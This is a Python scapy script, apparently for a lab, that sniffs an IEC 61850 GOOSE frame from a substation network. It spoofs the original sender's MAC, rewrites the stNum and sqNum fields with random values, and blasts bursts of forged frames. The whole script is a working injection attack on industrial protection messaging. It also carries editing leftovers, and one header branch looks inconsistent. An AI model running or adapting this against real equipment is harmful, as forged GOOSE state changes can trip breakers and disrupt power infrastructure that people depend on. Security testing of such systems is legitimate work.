import time
import struct
import random
import threading
from scapy.all import *

# --- LAB CONFIGURATION ---
INTERFACE = "Ethernet"
TARGET_APPID = 0x0003
BURST_SIZE = 12
INTERVAL = 100.0  # Seconds between randomized bursts
VLAN_PRIORITY = 0
VLAN_ID = 0
MAX_BURSTS = 12

# Get local MAC to prevent self-triggering
MY_MAC = get_if_hwaddr(INTERFACE)

def decode_ber_len(data, offset):
    """Decodes ASN.1 BER length. Returns (length_value, bytes_consumed)."""
    first_byte = data[offset]
    if first_byte < 0x80:
        return first_byte, 1
    else:
        n = first_byte & 0x7f
        return int.from_bytes(data[offset + 1 : offset + 1 + n], 'big'), n + 1

def encode_ber_int(tag, value):
    """Encodes an integer into a valid BER TLV triplet."""
    # Ensure value is positive and has correct byte length
    v_len = (value.bit_length() // 8) + 1
    val_bytes = value.to_bytes(v_len, 'big')
    # Clean up leading null byte if not needed for sign bit
    if len(val_bytes) > 1 and val_bytes[0] == 0x00 and not (val_bytes[1] & 0x80):
        val_bytes = val_bytes[1:]
    
    return bytes([tag, len(val_bytes)]) + val_bytes

def get_goose_map(pdu):
    """
    Surgically maps the GOOSE PDU by walking the TLV structure.
    Returns offsets for stNum (0x85) and sqNum (0x86).
    """
    mapping = {}
    # GOOSE Header: APPID(2), Len(2), Res(2), Res(2) = 8 bytes
    # APDU starts at index 8. Expected tag is 0x61
    if len(pdu) < 10 or pdu[8] != 0x61:
        return None

    apdu_len, len_size = decode_ber_len(pdu, 9)
    ptr = 9 + len_size
    end_of_apdu = ptr + apdu_len

    while ptr < end_of_apdu:
        tag = pdu[ptr]
        try:
            v_len, l_size = decode_ber_len(pdu, ptr + 1)
        except IndexError:
            break

        # Map only the header fields we need
        if tag in [0x85, 0x86]:
            mapping[tag] = {
                'offset': ptr,
                'full_len': 1 + l_size + v_len
            }
        
        # Stop at Data Set (0xab) to avoid payload false positives
        if tag == 0xab:
            mapping['payload_start'] = ptr
            break
            
        ptr += 1 + l_size + v_len
    
    return mapping if (0x85 in mapping and 0x86 in mapping) else None

def patch_pdu_lengths(pdu):
    """Corrects internal GOOSE PDU and APDU length fields."""
    raw_pdu = bytearray(pdu)
    total_len = len(raw_pdu)
    
    # 1. Total GOOSE PDU Length (Bytes 2-3)
    raw_pdu[2:4] = struct.pack("!H", total_len)
    
    # 2. APDU Length (Byte 9 onwards)
    if raw_pdu[9] == 0x81:
        raw_pdu[10] = total_len - 11
    elif raw_pdu[9] == 0x82:
        raw_pdu[10:12] = struct.pack("!H", total_len - 12)
    else:
        raw_pdu[9] = total_len - 10
        
    return bytes(raw_pdu)

def start_structural_hijack():
    print(f"[*] Monitoring {INTERFACE} for APPID {hex(TARGET_APPID)}...")
    print(f"[*] Filtering out our own MAC: {MY_MAC}")

    # 1. Capture Template
    pkt = sniff(iface=INTERFACE, count=1, 
                filter=f"ether proto 0x88b8 and not ether src {MY_MAC}")[0]
    
    print(f"[+] Template captured from {pkt.src}")

    # 2. Determine Header (VLAN vs Non-VLAN)
    has_vlan = pkt.haslayer(Dot1Q)
    if has_vlan:
        header = raw(Ether(src=pkt.src, dst=pkt.dst) / 
                     Dot1Q(prio=VLAN_PRIORITY, vlan=VLAN_ID, type=0x88B8))
        original_pdu = raw(pkt[Dot1Q].payload)
    else:
        header = raw(Ether(src=pkt.src, dst=pkt.dst) /
            Dot1Q(prio=VLAN_PRIORITY, vlan=VLAN_ID, type=0x88B8))
        original_pdu = raw(pkt[Ether].payload)  # ← this line is missing

    # 3. Initial Map
    mapping = get_goose_map(original_pdu)
    if not mapping:
        print("[-] Failed to parse GOOSE structure. Is this a valid APDU?")
        return

    send_sock = conf.L2socket(iface=INTERFACE)

    try:
        #while True:
        # 2. Change 'while True:' to this range-based loop:
        for burst_num in range(1, MAX_BURSTS + 1):
            # Randomize State
            current_st = random.randint(1, 500)
            current_sq_base = random.randint(1, 500)
            
            print(f"\n[!] TRIGGERING BURST: stNum={current_st}")

            for i in range(BURST_SIZE):
                sq_val = current_sq_base + i
                
                # Encode new TLVs
                st_tlv = encode_ber_int(0x85, current_st)
                sq_tlv = encode_ber_int(0x86, sq_val)

                # Surgical Rebuild using the Map
                # Parts: [Before stNum] + [New stNum] + [Between st/sq] + [New sqNum] + [After sqNum]
                m85 = mapping[0x85]
                m86 = mapping[0x86]

                part1 = original_pdu[:m85['offset']]
                part2 = original_pdu[m85['offset'] + m85['full_len'] : m86['offset']]
                part3 = original_pdu[m86['offset'] + m86['full_len'] :]

                new_pdu = part1 + st_tlv + part2 + sq_tlv + part3
                final_pdu = patch_pdu_lengths(new_pdu)

                # Blast
                send_sock.send(header + final_pdu)
                
            time.sleep(INTERVAL)

    except KeyboardInterrupt:
        print("\n[*] Lab terminated by user.")

if __name__ == "__main__":
    start_structural_hijack()